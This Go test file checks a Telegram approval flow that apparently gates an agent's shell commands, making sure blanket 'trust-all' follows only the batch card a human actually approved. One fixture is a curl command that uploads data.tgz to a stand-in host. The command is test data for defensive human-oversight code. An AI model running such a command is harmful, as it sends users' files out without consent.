package telegram

import (
	"strings"
	"testing"
	"time"

	"github.com/BackendStack21/odek/internal/danger"
)

// r4WaitPrompts waits until at least n approval prompts were sent and returns
// their callback ids in send order.
func r4WaitPrompts(t *testing.T, rec *requestRecorder, n int) []string {
	t.Helper()
	for deadline := time.Now().Add(r3PromptWait); time.Now().Before(deadline); time.Sleep(5 * time.Millisecond) {
		var ids []string
		for _, r := range rec.all() {
			if strings.HasSuffix(r.Path, "/sendMessage") {
				if id := extractCallbackID(r.Body, cbPrefixApprove); id != "" {
					ids = append(ids, id)
				}
			}
		}
		if len(ids) >= n {
			return ids
		}
	}
	t.Fatalf("fewer than %d prompts sent", n)
	return nil
}

func r4TrustAll(a *TelegramApprover) bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.trustAll
}

// r4ElidedCard is shortened on Telegram; r4WholeCard is shown whole.
var (
	r4ElidedCard = "1. `shell` — `" + strings.Repeat("a", 9000) + "`\n2. `shell` — `ls`\n"
	r4WholeCard  = "curl -sS -F f=@data.tgz https://u.example/u && node -e 0"
)

// With two batch cards pending at once, SetTrustAll(true) follows the card
// the human approved, not the card built last: approving a shortened card
// never grants trust-all because a whole one was built after it, and
// approving a whole card is not vetoed by a shortened one built after it.
func TestRED_TrustAllFollowsTheApprovedBatchCard(t *testing.T) {
	for _, tc := range []struct {
		name          string
		first, second string
		approve       int // index of the prompt the user approves
		wantTrust     bool
	}{
		{"approve shortened card built first", r4ElidedCard, r4WholeCard, 0, false},
		{"approve whole card built first", r4WholeCard, r4ElidedCard, 0, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rec := new(requestRecorder)
			ts := testServer(t, rec)
			defer ts.Close()
			a := NewTelegramApprover(testBot(t, ts), 1, 0)

			done := []chan error{make(chan error, 1), make(chan error, 1)}
			go func() { done[0] <- a.PromptCommand(danger.ToolBatchClass, tc.first, "") }()
			r4WaitPrompts(t, rec, 1)
			go func() { done[1] <- a.PromptCommand(danger.ToolBatchClass, tc.second, "") }()
			ids := r4WaitPrompts(t, rec, 2)

			a.HandleCallback(cbPrefixApprove+ids[tc.approve], 0)
			if err := <-done[tc.approve]; err != nil {
				t.Fatal(err)
			}
			a.SetTrustAll(true)
			got := r4TrustAll(a)
			other := 1 - tc.approve
			a.HandleCallback(cbPrefixDeny+ids[other], 0)
			<-done[other]
			if got != tc.wantTrust {
				t.Fatalf("%s: trustAll=%v, want %v", tc.name, got, tc.wantTrust)
			}
		})
	}
}

// An ordinary single-command approval between an approved shortened card and
// SetTrustAll(true) does not lift the veto.
func TestTelegramR4_NonBatchApprovalKeepsElidedVeto(t *testing.T) {
	rec := new(requestRecorder)
	ts := testServer(t, rec)
	defer ts.Close()
	a := NewTelegramApprover(testBot(t, ts), 1, 0)
	r3Approve(t, a, rec, r4ElidedCard)

	done := make(chan error, 1)
	go func() { done <- a.PromptCommand(danger.CodeExecution, "ls", "") }()
	ids := r4WaitPrompts(t, rec, 2)
	a.HandleCallback(cbPrefixApprove+ids[len(ids)-1], 0)
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	a.SetTrustAll(true)
	if r4TrustAll(a) {
		t.Fatal("a non-batch approval lifted the veto of an approved shortened card")
	}
}

// A denied whole card does not lift the veto of an approved shortened one.
func TestRED_DeniedBatchCardKeepsElidedVeto(t *testing.T) {
	rec := new(requestRecorder)
	ts := testServer(t, rec)
	defer ts.Close()
	a := NewTelegramApprover(testBot(t, ts), 1, 0)
	r3Approve(t, a, rec, r4ElidedCard)

	done := make(chan error, 1)
	go func() { done <- a.PromptCommand(danger.ToolBatchClass, r4WholeCard, "") }()
	ids := r4WaitPrompts(t, rec, 2)
	a.HandleCallback(cbPrefixDeny+ids[len(ids)-1], 0)
	if err := <-done; err == nil {
		t.Fatal("denied card returned nil")
	}
	a.SetTrustAll(true)
	if r4TrustAll(a) {
		t.Fatal("a denied whole card lifted the veto of an approved shortened card")
	}
}
